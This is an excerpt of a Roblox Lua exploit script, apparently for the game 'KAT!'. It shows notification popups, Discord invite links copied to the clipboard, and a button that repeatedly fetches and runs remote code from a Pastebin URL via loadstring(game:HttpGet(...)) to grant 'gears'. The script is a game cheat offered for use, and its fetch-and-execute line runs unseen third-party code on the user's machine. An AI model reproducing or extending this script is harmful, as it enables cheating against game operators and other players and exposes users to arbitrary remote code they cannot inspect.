...
game.StarterGui:SetCore("SendNotification", {
    Title = "KAT!";
    Text = "Made by Eren Yeaker"; -- what the text says (ofc)
    Duration = 5;
})
wait(1)
game.StarterGui:SetCore("SendNotification", {
...
DiscordServer_box.PlaceholderText = "https://discord.gg/TzFcCjk5ZF"
DiscordServer_box.Text = "https://discord.gg/TzFcCjk5ZF"
...
Tab2.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        loadstring(game:HttpGet("https://pastebin.com/raw/6yx56LgQ"))()
    end
end)
...
CopyDiscordServer.MouseButton1Down:connect(function()
    setclipboard("https://discord.gg/xtWxBhXtzs")
    wait(1)
    game.StarterGui:SetCore("SendNotification", {
        Title = "Success!";
        Text = "Copy Discord: https://discord.gg/xtWxBhXtzs"; -- what the text says (ofc)
        Duration = 5;
    })
end)
